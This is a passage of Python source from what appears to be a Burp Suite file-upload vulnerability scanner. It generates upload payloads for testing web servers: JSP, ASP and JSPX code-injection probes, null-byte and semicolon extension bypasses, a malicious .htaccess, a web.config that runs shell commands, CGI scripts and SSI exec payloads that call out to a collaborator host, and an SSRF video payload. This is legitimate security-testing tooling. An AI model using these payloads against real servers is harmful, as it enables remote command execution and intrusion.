        detail = "A Burp Colaborator interaction was detected when uploading an libavformat m3u8 payload " \
                 "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                 "Check https://hackerone.com/reports/115857 for more details. Also check manually if the website is not vulnerable to " \
                 "local file include. Interactions:<br><br>"
        issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)

        colabs = self.sender.send_collaborator(injector, burp_colab, Constants.AV_TYPES,
                                       basename + "M3u", content_m3u8, issue)

        # avi file with m3u as described on https://hackerone.com/reports/226756
        # https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.g2239eb85ba_0_20
        # and https://github.com/neex/ffmpeg-avi-m3u-xbin
        avi_generator = AviM3uXbin()

        name = "LibAvFormat SSRF"
        severity = "High"
        confidence = "Certain"
        detail = "A Burp Colaborator interaction was detected when uploading an libavformat m3u8 payload inside an AVI file " \
                 "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                 "Check https://hackerone.com/reports/226756 and https://github.com/neex/ffmpeg-avi-m3u-xbin for more details. " \
                 "Usually this means it is vulnerable to local file inclusion. Interactions:<br><br>"
        issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)

        #Yes this looks weird here that we pass content_m3u8, but that's correct
        colabs2 = self.sender.send_collaborator(injector, burp_colab, Constants.AV_TYPES,
                                         basename + "AviM3u", content_m3u8, issue, replace=avi_generator.get_avi_file)

        colabs.extend(colabs2)
        return colabs

    def _jsp_rce_params(self, extension, mime, content=""):
        lang = "JSP"
        if mime:
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.jsp' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.jsp' + self._marker_orig_ext, mime),
                # ('', '.jsp' + extension, ''),
                ('', '.jsp' + extension, mime),
                ('', '.jsp\x00' + extension, mime),
                ('', '.jsp%00' + extension, mime),
                ('', '.jsp', ''),
                ('', '.jsp', mime),
            }
        else:
            mime = "application/x-jsp"
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.jsp' + Constants.MARKER_ORIG_EXT, ''),
                ('', '.jsp\x00' + Constants.MARKER_ORIG_EXT, ''),
                ('', '.jsp%00' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.jsp\x00' + self._marker_orig_ext, mime),
                # ('', '.jsp%00' + self._marker_orig_ext, mime),
                ('', '.jsp', ''),
                ('', '.jsp', mime),
            }
        return lang, types, content

    def _jspx_rce_params(self, extension, mime, content=""):
        lang = "JSPX"
        if mime:
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.jspx' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.jspx' + self._marker_orig_ext, mime),
                # ('', '.jspx.'+ extension, ''),
                ('', '.jspx' + extension, mime),
                ('', '.jspx\x00' + extension, mime),
                ('', '.jspx%00' + extension, mime),
                ('', '.jspx', ''),
                ('', '.jspx', mime),
            }
        else:
            mime = "application/x-jsp"
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.jspx' + Constants.MARKER_ORIG_EXT, ''),
                ('', '.jspx\x00' + Constants.MARKER_ORIG_EXT, ''),
                ('', '.jspx%00' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.jspx\x00' + self._marker_orig_ext, mime),
                # ('', '.jspx%00' + self._marker_orig_ext, mime),
                ('', '.jspx', ''),
                ('', '.jspx', mime),
            }
        return lang, types, content

    @staticmethod
    def _jsp_gen_payload_expression_lang():
        # these numbers are arbitrary but make sure we don't get an int overflow...
        a = random.randint(3, 134)
        b = random.randint(3, 8456)
        c = random.randint(3, 7597)
        d = random.randint(3, 65123)
        e = random.randint(1000000000000000, 2115454131589564)
        payload = "${" + str(a) + " * " + str(b) + "+" + str(c) + "+" + str(d) + "+" + str(e) + "}"
        # make sure the payload has always the same length
        desired_length = 60
        payload = (desired_length - len(payload)) * " " + payload
        expect = str(a * b + c + d + e)
        return payload, expect

    @staticmethod
    def _jsp_gen_payload_tags():
        r = ''.join(random.sample(string.ascii_letters, 5))
        payload = '<% System.out.println("InJ" + "eCt"+"TeSt-' + r + '"); %>'
        expect = 'InJeCtTeSt-' + r
        return payload, expect

    @staticmethod
    def _jspx_gen_payload():
        """Actually this is JSPX with JSP 2.0"""
        one = ''.join(random.sample(string.ascii_letters, 8))
        two = ''.join(random.sample(string.ascii_letters, 8))
        three = ''.join(random.sample(string.ascii_letters, 8))
        payload = '''<tags:xhtmlbasic xmlns:tags="urn:jsptagdir:/WEB-INF/tags"
                 xmlns:jsp="http://java.sun.com/JSP/Page"
                 xmlns:fmt="http://java.sun.com/jsp/jstl/fmt"
                 xmlns="http://www.w3.org/1999/xhtml">
                  <jsp:directive.page contentType="text/html" />
                  <head>
                    <title>JSPX</title>
                  </head>
                  <body>
                    <c:set var="three" value='${"''' + three + '''"}'/>
                    <c:set var="one" value='${"''' + one + '''"}'/>
                    <c:set var="two" value='${"''' + two + '''"}'/>
                    <text>${one}${two}${three}</text>
                  </body>
                </tags:xhtmlbasic>'''
        expect = one + two + three
        return payload, expect

    def _jsp_rce(self, injector):
        # automated approach with BackdooredFile class
        # sadly, the only two types that produce valid JSP files that can be detected by this plugin are GIF and PDF
        # with all others the JSP files starts with high byte values or the JSP parser throws another exception. For example:
        # org.apache.jasper.JasperException: java.lang.ClassNotFoundException: org.apache.jsp.uploads._1DownloadMeMetamakernotesJSP3_jsp
        # org.apache.jasper.servlet.JspServletWrapper.getServlet(JspServletWrapper.java:177)
        # org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:369)
        # org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
        # org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
        # javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        # or
        # org.apache.jasper.JasperException: Unable to compile class for JSP
        # org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:661)
        # org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
        # org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
        # org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
        # javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        # while that can be interesting too, it doesn't justify to send all kind of formats that only produce errors
        # therefore we send only GIF and PDF, as well as JPEG to trigger the error case (JPEG is probably the most popular format)
        # As JPEG and PNG both start with non-ascii, this is probably not possible. But let me know if you figure it out :)
        # But on the other hand we have different injection possibilities:
        # Expression Language with ${}
        # Old school tags <%  %>
        # TODO feature: Let me know if I'm wrong and there are installations which work fine with such files

        non_working_formats = {".png", ".tiff"}
        used_formats = set(BackdooredFile.EXTENSION_TO_MIME.keys()) - non_working_formats
        self.attacks._servercode_rce_backdoored_file(injector, self._jsp_gen_payload_expression_lang, self._jsp_rce_params, self.burp_extender._globalOptionsPanel,
                                             formats=used_formats)
        self.attacks._servercode_rce_backdoored_file(injector, self._jsp_gen_payload_tags, self._jsp_rce_params, self.burp_extender._globalOptionsPanel,
                                             formats=used_formats)

        # Boring, classic, straight forward jsp file:
        self.attacks._servercode_rce_simple(injector, self._jsp_gen_payload_expression_lang, self._jsp_rce_params)
        self.attacks._servercode_rce_simple(injector, self._jsp_gen_payload_tags, self._jsp_rce_params)

        # New JSP XML Syntax (.jspx)
        self.attacks._servercode_rce_simple(injector, self._jspx_gen_payload, self._jspx_rce_params)

        # rce gif content:
        # TODO feature: change this to something more unique... in general, change that attacks._servercode_rce_gif_content method
        payload_exact_13_len = "${'InJeCtTe'}"
        to_expect = "InJeCtTe"
        lang, types, _ = self._jsp_rce_params(".gif", "image/gif")
        self.attacks._servercode_rce_gif_content(injector, lang, payload_exact_13_len, types, expect=to_expect)

    def _asp_rce_params(self, extension, mime, content=""):
        lang = "ASP"
        if mime:
            # TODO feature: include .asa and .asax etc. but we need a Windows test server for that first
            # According to https://community.rapid7.com/community/metasploit/blog/2009/12/28/exploiting-microsoft-iis-with-metasploit
            # the file extension .asp;.png should work fine... see also https://soroush.secproject.com/downloadable/iis-semicolon-report.pdf
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.asp;' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.asp' + self._marker_orig_ext, mime),
                # ('', '.asp.' + extension, ''),
                ('', '.asp;' + extension, mime),
                ('', '.asp' + extension, mime),
                ('', '.asp\x00' + extension, mime),
                ('', '.asp%00' + extension, mime),
                ('', '.asp', ''),
                ('', '.asa', ''),
                ('', '.asax', ''),
                #('', '.asp', mime),
                ('', '.aspx', mime)
            }
        else:
            mime_asp = 'application/asp'
            mime_aspx = 'application/aspx'
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.asp;' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.asp' + self._marker_orig_ext, mime_asp),
                ('', '.asp\x00' + Constants.MARKER_ORIG_EXT, ''),
                ('', '.asp%00' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.asp\x00' + self._marker_orig_ext, mime_asp),
                # ('', '.asp%00' + self._marker_orig_ext, mime_asp),
                ('', '.asp', ''),
                ('', '.asp', mime_asp),
                ('', '.aspx', ''),
                ('', '.aspx', mime_aspx),
            }

        return lang, types, content

    @staticmethod
    def _asp_gen_payload():
        r = ''.join(random.sample(string.ascii_letters, 5))
        payload = '<%= "In"+"Je' + r + 'C" + "t.Te"+"St" %>'
        expect = 'InJe' + r + 'Ct.TeSt'
        return payload, expect

    def _asp_rce(self, injector):
        # automated approach with BackdooredFile class
        self.attacks._servercode_rce_backdoored_file(injector, self._asp_gen_payload, self._asp_rce_params, self.burp_extender._globalOptionsPanel)

        # Boring, classic, straight forward asp file:
        self.attacks._servercode_rce_simple(injector, self._asp_gen_payload, self._asp_rce_params)

        payload_exact_13_len = '<%= "A"+"B"%>'
        lang, types, _ = self._asp_rce_params(".gif", "image/gif")
        self.attacks._servercode_rce_gif_content(injector, lang, payload_exact_13_len, types)

    def _htaccess(self, injector, burp_colab):
        htaccess = ".htaccess"
        title = ".htaccess upload"
        content = "Options +Indexes +Includes +ExecCGI\n" \
                  "AddHandler cgi-script .cgi .pl .py .rb\n" \
                  "AddHandler server-parsed .shtml .stm .shtm .html .jpeg .png .mp4\n" \
                  "AddOutputFilter INCLUDES .shtml .stm .shtm .html .jpeg .png .mp4\n"
        desc = ".htaccess files can be used to do folder specific configurations in Apache. A filename of {} was " \
               "uploaded with content '{}' and detected that the page later on includes the string 'Index of /'. " \
               "This could mean that the .htaccess we uploaded enabled a directory listing. Additionally it enabled " \
               "server side includes, if you can upload files with a server side include extension they can now be " \
               "executed. ".format(htaccess, content)
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Medium")

        urrs = self.sender.simple(injector, Constants.HTACCESS_TYPES, htaccess, content, redownload=True, randomize=False)
        # We only need to do this for one, not for all
        urr = urrs[0]
        if urr and urr.download_rr:
            url = FloydsHelpers.u2s(self.callback_helpers.analyzeRequest(urr.download_rr).getUrl().toString())
            try:
                path = urlparse.urlparse(url).path
            except ValueError:
                # Catch https://github.com/modzero/mod0BurpUploadScanner/issues/12
                path = None
            if path:
                path_no_filename = path.rsplit("/", 1)[0] + "/"
                self.dl_matchers.add(DownloadMatcher(issue, filecontent="Index of /", url_content=path_no_filename))
                self.sender.send_get_request(urr.download_rr, path_no_filename, injector.opts.create_log)

        if not burp_colab:
            return []

        # Interesting way with a web.config file
        return self._htaccess_asp_web_config(injector, burp_colab)

    def _htaccess_asp_web_config(self, injector, burp_colab):
        colab_tests = []

        one = ''.join(random.sample(string.ascii_letters, 8))
        two = ''.join(random.sample(string.ascii_letters, 8))
        three = ''.join(random.sample(string.ascii_letters, 8))

        # create replace list and file that executes all rce commands at once
        replace_list = []
        command_names = []
        commands = ""
        for cmd_name, cmd, server, replace in Checks_Helper.get_rce_interaction_commands(injector, burp_colab):
            replace_list.append(replace)
            command_names.append(cmd_name)
            commands += 'Set wShell1 = CreateObject("WScript.Shell")\n'
            commands += 'Set cmd1 = wShell1.Exec("{} {}")\n'.format(cmd, server)

        content = """<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!--
<%
a = "{}"
b = "{}"
c = "{}"
Response.write("-"&"->")
Response.write(a&c&b)
{}
%>
-->""".format(one, two, three, commands)
        expect = one + three + two

        basename = "web"
        types = {
            ('', '.config::$DATA', ''),
            ('', '.config', '')
        }
        title = "Web.config RCE"
        base_detail = 'The server executes web.config files that are uploaded, which results in a Remote Command Execution (RCE). <br>' \
                      'See https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/ .'
        detail_download = "A web.config file was uploaded and in the download the ASP concatenation of three variables was " \
                          "replaced with {} only. <br><br> {} <br>".format(expect, base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading a web.config file executing {} for a " \
                       "burp collaborator URL. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(", ".join(command_names), base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title, detail_download, "Certain", "High")
        issue_colab = self._create_issue_template(injector.get_brr(), title, detail_colab, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=expect))
        # We do not need to call self.sender.simple here as in this case the send_collaborator will be sufficient
        colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, types, basename, content, issue_colab,
                                                   redownload=True, replace=replace_list, randomize=False))

        return colab_tests

    def _cgi(self, injector, burp_colab):
        colab_tests = []

        if not burp_colab:
            return []

        # Do not forget, for CGI to work, the files have to be executable (chmod +x), which will not be the case
        # for a lot of servers...
        # Therefore additional sleep based payloads would not make sense

        rand_a = ''.join(random.sample(string.ascii_letters, 20))
        rand_b = ''.join(random.sample(string.ascii_letters, 20))
        expect = rand_a + rand_b
        # create replace list and file that executes all rce commands at once
        replace_list = []
        command_names = []
        commands = ""
        for cmd_name, cmd, server, replace in Checks_Helper.get_rce_interaction_commands(injector, burp_colab):
            replace_list.append(replace)
            command_names.append(cmd_name)
            commands += "`{} {}`;\n".format(cmd, server)

        # Do NOT print(a status header (HTTP/1.0 200 OK) for perl)
        content_perl = "#!/usr/bin/env perl\n" \
                       "print \"Content-type: text/html\\n\\n\"\n" \
                       "{}" \
                       "local ($k);\n" \
                       "$k = \"{}\";\n" \
                       "print $k . \"{}\";".format(commands, rand_a, rand_b)
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Perl"
        title = "Perl code injection"
        base_detail = 'The server executes Perl files that are uploaded, which results in a Remote Command Execution (RCE). '
        detail_download = "A Perl file was uploaded and in the download the code $k = '{}'; print $k . '{}'; was " \
                          "replaced with {} only. <br><br> {} <br>".format(rand_a, rand_b, expect, base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading a Perl file executing {} for a " \
                       "burp collaborator URL. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(", ".join(command_names), base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title, detail_download, "Certain", "High")
        issue_colab = self._create_issue_template(injector.get_brr(), title, detail_colab, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=expect))
        # We do not need to call self.sender.simple here as in this case the send_collaborator will be sufficient
        colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.PL_TYPES, basename, content_perl, issue_colab,
                                               redownload=True, replace=replace_list))


        rand_a = ''.join(random.sample(string.ascii_letters, 20))
        rand_b = ''.join(random.sample(string.ascii_letters, 20))
        expect = rand_a + rand_b
        # create DNS or IP Collaborator URl
        if burp_colab.is_ip_collaborator:
            python3_url = "http://test.example.org/Python3"
            python2_url = "http://test.example.org/Python2"
        else:
            python3_url = "http://python3.test.example.org/Python3"
            python2_url = "http://python2.test.example.org/Python2"

        # Do NOT print(a status header (HTTP/1.0 200 OK) for python)
        content_python = "#!/usr/bin/env python\n" \
                       "import sys\n" \
                       "print 'Content-type: text/html\\n\\n'\n" \
                       "if sys.version_info >= (3, 0):\n" \
                       "  import urllib.request\n" \
                       "  urllib.request.urlopen('{}').read()\n" \
                       "else:\n" \
                       "  import urllib2\n" \
                       "  urllib2.urlopen('{}').read()\n" \
                       "k = '{}'\n" \
                       "print k + '{}'".format(python3_url, python2_url, rand_a, rand_b)
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Python"
        title = "Python code injection"
        base_detail = 'The server executes Python files that are uploaded, which results in a Remote Command Execution (RCE). '
        detail_download = "A Python file was uploaded and in the download the code k = '{}'; print k + '{}'; was " \
                          "replaced with {} only. <br><br> {} <br>".format(rand_a, rand_b, expect, base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading a Python file executing a GET request for a " \
                       "burp collaborator URL. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title, detail_download, "Certain", "High")
        issue_colab = self._create_issue_template(injector.get_brr(), title, detail_colab, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=expect))
        # We do not need to call self.sender.simple here as in this case the send_collaborator will be sufficient
        colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.PY_TYPES, basename, content_python, issue_colab,
                                                   redownload=True, replace="test.example.org"))


        rand_a = ''.join(random.sample(string.ascii_letters, 20))
        rand_b = ''.join(random.sample(string.ascii_letters, 20))
        expect = rand_a + rand_b
        # create DNS or IP Collaborator URl
        if burp_colab.is_ip_collaborator:
            ruby_url = "http://test.example.org/Ruby"
        else:
            ruby_url = "http://ruby.test.example.org/Ruby"
        # Do NOT print(a status header (HTTP/1.0 200 OK) for ruby)
        content_ruby1 = "#!/usr/bin/env ruby\n" \
                       "require 'net/http'\n" \
                       "puts \"Content-type: text/html\\n\\n\"\n" \
                       "url=URI.parse('{}')\n" \
                       "req=Net::HTTP::Get.new(url.to_s)\n" \
                       "Net::HTTP.start(url.host,url.port){|http|http.request(req)}\n"
        content_ruby2 = "k = \"{}\"\n" \
                       "puts k + \"{}\"".format(ruby_url, rand_a, rand_b)
        content_ruby = content_ruby1 + content_ruby2
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Ruby"
        title = "Ruby code injection"
        base_detail = 'The server executes Ruby files that are uploaded, which results in a Remote Command Execution (RCE). '
        detail_download = "A Ruby file was uploaded and in the download the code k = \"{}\"; puts k + \"{}\"; was " \
                          "replaced with {} only. <br><br> {} <br>".format(rand_a, rand_b, expect, base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading a Ruby file executing a GET request for a " \
                       "burp collaborator URL. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title, detail_download, "Certain", "High")
        issue_colab = self._create_issue_template(injector.get_brr(), title, detail_colab, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=expect))
        # We do not need to call self.sender.simple here as in this case the send_collaborator will be sufficient
        colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.RB_TYPES, basename, content_ruby, issue_colab,
                                                   redownload=True, replace="test.example.org"))

        # Not going to add as a feature: elf binary .cgi files
        # If those work, then Python or Perl works in most cases too...

        return colab_tests

    @staticmethod
    def _ssi_payload():
        non_existant_domain = "{}.{}.local".format(str(random.randint(100000, 999999)), str(random.randint(100000, 999999)))
        expect = " can't find " + non_existant_domain
        content = '<!--#exec cmd="nslookup ' + non_existant_domain + '" -->'
        return content, expect

    def _ssi(self, injector, burp_colab):
        issue_name = "SSI injection"
        severity = "High"
        confidence = "Certain"

        # Reflected nslookup
        # This might fail if the DNS is responding with default DNS entries, then it won't say "can't find" and the
        # domain but I couldn't come up with anything better for SSI except Burp collaborator payloads and this...
        # At least "can't find" + domain is present in Linux and Windows nslookup output
        main_detail = "A certain string was dectected when uploading and downloading an Server Side Include file with a " \
                      "payload that executes commands with nslookup. Therefore arbitrary command execution seems possible. " \
                      "Note that if you enabled the .htaccess module as well, this attack might have only succeeded because " \
                      "we were already able to upload a .htaccess file that enables SSI. The payload in this attack was: " \
                      "<br><br>{}<br><br> The found string in a response was: " \
                      "<br>{}<br><br>"

        # Reflected nslookup - Simple
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SsiReflectDnsSimple"
        content, expect = self._ssi_payload()
        detail = main_detail.format(cgi.escape(content), cgi.escape(expect))
        issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
        self.sender.simple(injector, Constants.SSI_TYPES, basename, content, redownload=True)

        # Reflected nslookup - File metadata
        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self.burp_extender._globalOptionsPanel.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, expect, name, ext, content in bi.get_files(size, self._ssi_payload):
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SsiReflectDns" + name
            detail = main_detail + "In this case the payload was injected into a file with metatadata of type {}."
            detail = detail.format(cgi.escape(content), cgi.escape(expect), name)
            issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
            self.sender.simple(injector, Constants.SSI_TYPES, basename, content, redownload=True)

        # TODO: Decide if additional sleep based payloads would make sense, probably rather not

        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []

        colab_tests = []

        # RCE with Burp collaborator
        base_detail = "A burp collaborator interaction was dectected when uploading an Server Side Include file with a payload that " \
                "executes commands with a burp collaborator URL. Therefore arbitrary command execution seems possible. Note that if " \
                "you enabled the .htaccess module as well, this attack might have only succeeded because we were " \
                "already able to upload a .htaccess file that enables SSI. "

        # RCE with Burp collaborator - Simple
        for cmd_name, cmd, server, replace in Checks_Helper.get_rce_interaction_commands(injector, burp_colab):
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SsiColab" + cmd_name
            content = '<!--#exec cmd="{} {}" -->'.format(cmd, server)
            detail = "{}A {} payload was used. <br>Interactions: <br><br>".format(base_detail, cmd_name)
            issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
            colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.SSI_TYPES, basename,
                                                       content, issue, replace=replace, redownload=True))

        # RCE with Burp collaborator - File metadata
        # For SSI backdoored files we only use the first payload type (either nslookup or wget)
        # as otherwise we run into a combinatoric explosion with payload types multiplied with exiftool techniques
        base_desc = 'Remote command execution through SSI payload in Metadata of type {}. The server executed a SSI ' \
                    'Burp Collaborator payload with {} inside the uploaded file. ' \
                    '<br>Interactions: <br><br>'
        cmd_name, cmd, server, replace = next(iter(Checks_Helper.get_rce_interaction_commands(injector, burp_colab)))
        ssicolab = SsiPayloadGenerator(burp_colab, cmd, server, replace)
        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self.burp_extender._globalOptionsPanel.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, _, name, ext, content in bi.get_files(size, ssicolab.payload_func):
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SsiBfRce" + name
            desc = base_desc.format(cgi.escape(name), cgi.escape(cmd_name))
            issue = self._create_issue_template(injector.get_brr(), issue_name, base_detail + desc, confidence, severity)
            colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.SSI_TYPES, basename,
                                                       content, issue, replace=ssicolab.placeholder, redownload=True))

        return colab_tests

    @staticmethod
    def _esi_payload():
        one = ''.join(random.sample(string.ascii_letters, 5))
        two = ''.join(random.sample(string.ascii_letters, 5))
        three = ''.join(random.sample(string.ascii_letters, 5))
        content = '{}<!--esi-->{}<!--esx-->{}'.format(one, two, three)
        expect = '{}{}<!--esx-->{}'.format(one, two, three)
        return content, expect

    def _esi(self, injector, burp_colab):
        issue_name = "ESI injection"
        severity = "High"
        confidence = "Certain"

        # Reflected stripped esi tag
        base_detail = "When uploading an Edge Side Include file with a payload of {}, the server later responded with " \
                      "{} only. This means that ESI might be enabled. The payload was an Edge Side Include (ESI) tag, see " \
                      "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. "

        # Reflected stripped esi tag - Simple
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "EsiReflectSimple"
        content, expect = self._esi_payload()
        detail = base_detail.format(cgi.escape(content), cgi.escape(expect))
        issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
        self.sender.simple(injector, Constants.ESI_TYPES, basename, content, redownload=True)

        # Reflected nslookup - File metadata
        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self.burp_extender._globalOptionsPanel.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, expect, name, ext, content in bi.get_files(size, self._esi_payload):
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "EsiReflect" + name
            detail = base_detail + "In this case the payload was injected into a file with metatadata of type {}."
            detail = detail.format(cgi.escape(content), cgi.escape(expect), name)
            issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
            self.sender.simple(injector, Constants.ESI_TYPES, basename, content, redownload=True)

        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []

        colab_tests = []

        # ESI injection - includes remote URL -> burp collaborator
        # According to feedback on https://github.com/modzero/mod0BurpUploadScanner/issues/11
        # this is unlikely to be successfully triggered
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "EsiColab"
        content = '<esi:include src="{}1.html" alt="{}" onerror="continue"/>'.format(Constants.MARKER_COLLAB_URL, Constants.MARKER_CACHE_DEFEAT_URL)
        detail = "A burp collaborator interaction was dectected when uploading an Edge Side Include file with a payload that " \
                 "includes a burp collaborator URL. The payload was an Edge Side Include (ESI) tag, see " \
                 "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. As it is unlikely " \
                 "that ESI attacks result in successful Burp Collaborator interactions, this is also likely to " \
                 "be a Squid proxy, which is one of the few proxies that support that.<br>Interactions: <br><br>"
        issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
        colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.ESI_TYPES, basename,
                                                   content, issue, redownload=True))

        # Not doing the metadata file + Burp Collaborator approach here, as that seems to be a waste of requests as explained
        # on https://github.com/modzero/mod0BurpUploadScanner/issues/11

        return colab_tests

    def _eicar(self, injector):
        # it would be easy to add GTUBE (spam detection test file), but there seems to be too little benefit for that
        # https://en.wikipedia.org/wiki/GTUBE
        # Additionally, it is hard to test if "illegal" content such as adult content can be uploaded as
        # there is no test file for that.
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Eicar"
        content_eicar = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDK" + "Td9JEVJQ0FSLVNUQU5EQVJEL" + "UFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="
        content_eicar = content_eicar.decode("base64")
        title = "Malicious Eicar upload/download"
        desc = 'The eicar antivirus test file was uploaded and downloaded. That probably means there is no antivirus' \
               'installed on the server. That reduces the attack surface (attackers can not attack the antivirus ' \
               'software) but if any uploaded files are ever executed, then malware is not detected. You should try ' \
               'to upload an executable (e.g. with the recrusive uploader module of the UploadScanner).'
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Low")
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=content_eicar))
        self.sender.simple(injector, Constants.EICAR_TYPES, basename, content_eicar, redownload=True)
        return []

    def _pdf(self, injector, burp_colab):

        # TODO: Check if this should be implemented: http://michaeldaw.org/backdooring-pdf-files

        colab_tests = []

        if injector.opts.file_formats['pdf'].isSelected():
            #A boring PDF with some JavaScript
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "PdfJavascript"
            content = '%PDF-1.0\n%\xbf\xf7\xa2\xfe\n%QDF-1.0\n\n%% Original object ID: 1 0\n1 0 obj\n<<\n  /AA <<\n    ' \
                      '/WC <<\n      /JS (app.alert\\("http://www.corkami.com \\(Closing\\)"\\);)\n      /S /\n    >>\n' \
                      '  >>\n  /OpenAction <<\n    /JS (app.alert\\("http://www.corkami.com \\(Open Action\\)"\\);)\n  ' \
                      '  /S /JavaScript\n  >>\n  /Pages 2 0 R\n>>\nendobj\n\n%% Original object ID: 2 0\n2 0 obj\n<<\n ' \
                      ' /Count 1\n  /Kids [\n    3 0 R\n  ]\n>>\nendobj\n\n%% Page 1\n%% Original object ID: 3 0\n3 0 ' \
                      'obj\n<<\n  /AA <<\n    /O <<\n      /JS (app.alert\\("http://www.corkami.com \\(Additional Action' \
                      '\\)"\\);)\n      /S /JavaScript\n    >>\n  >>\n  /Parent 2 0 R\n>>\nendobj\n\nxref\n0 4\n0000000000 ' \
                      '65535 f \n0000000052 00000 n \n0000000328 00000 n \n0000000422 00000 n \ntrailer <<\n  /Root 1 0 ' \
                      'R\n  /Size 4\n  /ID [<a35f6bb80bdac8e3c95c298f6177b175><a35f6bb80bdac8e3c95c298f6177b175>]\n>>\n' \
                      'startxref\n585\n%%EOF\n'
            title = "Malicious PDF with JavaScript upload/download"
